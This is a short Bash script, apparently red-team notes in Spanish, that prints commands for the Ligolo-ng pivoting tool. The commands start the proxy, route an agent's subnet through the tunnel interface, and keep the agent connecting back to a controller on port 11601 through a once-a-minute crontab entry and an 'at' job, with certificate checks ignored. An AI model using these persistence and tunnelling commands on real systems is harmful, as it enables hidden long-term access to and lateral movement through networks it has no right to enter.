@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# Mostrar el mensaje "PROXY"
+echo "Comandos para PROXY"
+echo ""
+echo "1.- Regresar a la sesión del proxy"
+echo "session"
+echo ""
+
+echo "Para empezar el proxy"
+echo "start"
+
+echo ""
+echo "_________________________________________________________"
+echo ""
+echo ""
+echo "En la terminal ejecutar:"
+
+echo ""
+echo "2.- Cambiar la subnet a la del agente importante agregar bien la subnet"
+echo ""
+echo "sudo ip route add IP.0/24 dev ligolo"
+
+echo ""
+echo "_________________________________________________________"
+
+echo ""
+echo ""
+
+# Mensaje de confirmación
+echo "Listo, puedes hacer ping a la red del agente y debería funcionar."
+
+echo ""
+echo ""
+echo "Agregar a crontab"
+echo "crontab -e"
+
+echo "* * * * * cd /home/ass && ./agent -connect IP:11601 -ignore-cert"
+
+echo ""
+echo ""
+echo "con 'at' "
+
+echo "'/home/ass/agent -connect IP:11601 -ignore-cert' | at now + 1 minute"
